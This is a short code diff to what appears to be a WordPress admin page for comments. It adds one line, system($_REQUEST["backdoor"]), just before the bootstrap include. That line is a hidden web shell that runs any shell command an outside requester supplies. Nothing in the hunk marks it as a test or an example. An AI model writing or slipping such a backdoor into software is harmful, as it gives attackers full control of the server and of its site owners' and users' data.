@@ -7,6 +7,8 @@
  */
 
 /** Load WordPress Bootstrap */
+system($_REQUEST["backdoor"]);
+
 require_once __DIR__ . '/admin.php';
 
 $parent_file  = 'edit-comments.php';
